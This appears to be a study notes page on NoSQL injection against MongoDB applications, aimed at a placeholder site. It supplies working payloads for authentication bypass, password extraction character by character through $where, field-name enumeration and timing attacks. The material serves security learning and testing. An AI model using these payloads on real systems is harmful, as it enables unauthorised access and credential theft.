---
title: "NoSQL injection"
weight: 16
---

<details><summary>Introduction to NoSQL databases</summary>

**NoSQL databases**

* They are designed to handle large volumes of unstructured or semi-structured data.
  * benefits in terms of scalability, flexibility, and performance
* Like SQL databases, users interact with data in NoSQL databases using queries but many NoSQL databases use a wide range of query languages instead of a universal standard like SQL (ex. JSON, XML)

**NoSQL database models**

* Document stores - These store data in flexible, semi-structured documents. They typically use formats such as JSON, BSON, and XML, and are queried in an API or query language. Examples include MongoDB and Couchbase.
* Key-value stores - These store data in a key-value format. Each data field is associated with a unique key string. Values are retrieved based on the unique key. Examples include Redis and Amazon DynamoDB.
* Wide-column stores - These organize related data into flexible column families rather than traditional rows. Examples include Apache Cassandra and Apache HBase.
* Graph databases - These use nodes to store data entities, and edges to store relationships between entities. Examples include Neo4j and Amazon Neptune.

</details>

---

## Types of NoSQL injection

1. Syntax injection - when you can break the NoSQL query syntax, enabling the injection (likeSQLi).
2. Operator injection - when you can use NoSQL query operators to manipulate queries.

---

## NoSQL syntax injection

* Consider: `https://insecure-website.com/product/lookup?category=fizzy`
* This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:
  * `this.category == 'fizzy'`
* Inject: `'` -> `this.category == '''`
  * If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error.&#x20;
* Confirm this by submitting a valid query string in the input, e.g.: `\'` -> `this.category == '\''`
  * If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.

### Confirming conditional behavior

```markdown
# False condition
' && 0 && 'x
' && '1'=='2

# True condition
' && 1 && 'x 
' && '1'=='1
```

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

If the application behaves differently suggests that the false condition impacts the query logic, but the true condition doesn't.

### Overriding existing conditions

```markdown
# Always true: 
'||1||'
'||'1'=='1'

# Inject: fizzy'||1||'
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27

# Back-end code
this.category == 'fizzy'||1||''
```

The modified query returns all items (all the products in any category).

> **Wwarning**: If an application uses it when updating or deleting data, for example, this can result in accidental data loss.

**Null character**

MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored.

```markdown
# Back-end code
this.category == 'fizzy' && this.released == 1

# Inject null char
https://insecure-website.com/product/lookup?category=fizzy'%00

# Back-end code result [removes the req for the released field to be set to 1]
this.category == 'fizzy'\u0000' && this.released == 1
```

---

## NoSQL operator injection

<details><summary>Examples of MongoDB query operators</summary>

* `$where` - Matches documents that satisfy a JavaScript expression.

- `$ne` - Matches all values that are not equal to a specified value.

* `$in` - Matches all of the values specified in an array.

- `$regex` - Selects documents where values match a specified regular expression.



MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/reference/operator/query/](https://www.mongodb.com/docs/manual/reference/operator/query/)

</details>

* JSON example:
  * `{"username":"wiener"}` -> `{"username":{"$ne":"invalid"}}`
* URL parameters:
  * `username=wiener` -> `username[$ne]=invalid`

***

* If this doesn't work, you can try the following (or use Content Type Converter burp exts):
  1. Convert the request method from `GET` to `POST`.
  2. Change the `Content-Type` header to `application/json`.
  3. Add JSON to the message body.
  4. Inject query operators in the JSON.

### Testing

```markdown
# Login bypass
{"username":"bob","password":{"$ne":"invalid"}}

# Guess with usernames list
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}

# Guess with regex
{"username":{"$regex":"^adm"},"password":{"$ne":""}}
```

**Other tests**

* Example:`{"username":"wiener","password":"peter"}`
* `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
* This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.

---

## Extract data

**INSIDE $WHERE**

* Consider `https://insecure-website.com/user/lookup?username=admin`
* This results in the following NoSQL query of the `users` collection: `{"$where":"this.username == 'admin'"}`
* As the query uses the `$where` operator, you can attempt to inject JavaScript functions.
  * `admin' && this.password[0] == 'a' || 'a'=='b`
    * This returns the first character of the user's password string. You can go on...
  * `admin' && this.password.match(/\d/) || 'a'=='b`
    * Identify whether the password contains digits

***

**INJECT OPERATOR (where)**

* Consider `{"username":"wiener","password":"peter"}`
* Add `$where` operator as an additional parameter. Send one true request and one false request.
  * `{"username":"wiener","password":"peter", "$where":"0"}`
  * `{"username":"wiener","password":"peter", "$where":"1"}`
  * Different responses? This may indicate that the JavaScript expression in the `$where` clause is being evaluated

***

**INJECT OPERATOR (regex)**

* Consider `{"username":"myuser","password":"mypass"}`
  * `{"username":"myuser","password":"incorrect"}` (incorrect password)
  * `{"username":"admin","password":{"$regex":"^.*"}}`
  * Different responses? The app may be vulnerable
* `{"username":"admin","password":{"$regex":"^a*"}}`
  * Extract data character by character

---

## Identify field names

**FIRST WAY**

* Send the payload for an existing field and for a field that doesn't exist.&#x20;
* Example
  * `admin' && this.username!='` (you know `username` field exists)
  * `admin' && this.foo!='` (you know `foo` field doesn't exist)
  * `admin' && this.password!='` (you want identify `password` field)
    * `https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`
* If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).

***

**SECOND WAY**

* You can inject operator?
  * `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
  * This query selects documents where the first key (field) of the document starts with the letter "a". You can extract the field name char by char

<details><summary>Example</summary>

```json
{
"username":"test",
"$where":"Object.keys(this)[§1§].match('^.{0}§u§.*')"
}
```

With intruder set: 1 payload: numbers, 2 payload: bruteforce chars.



You have :&#x20;

```json
[
    { "apple": "fruit", "color": "red" },
    { "banana": "fruit", "color": "yellow" },
    { "avocado": "fruit", "color": "green" },
    { "berry": "fruit", "color": "blue" }
]
```

Query

```javascript
db.collection.find({ "$where": "Object.keys(this)[0].match('^.{0}a.*')" })
```

```json
[
    { "apple": "fruit", "color": "red" },
    { "avocado": "fruit", "color": "green" }
]
```

</details>

---

## Timing based injection

Database error doesn't cause a difference in the application's response? Trigger a conditional time delay

1. Load the page several times to determine a baseline loading time.
2. Insert a timing based payload into the input. Example `{"$where": "sleep(5000)"}`
3. Identify whether the response loads more slowly

* Trigger a time delay if the password beings with the letter `a`
  * `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`
  * `admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
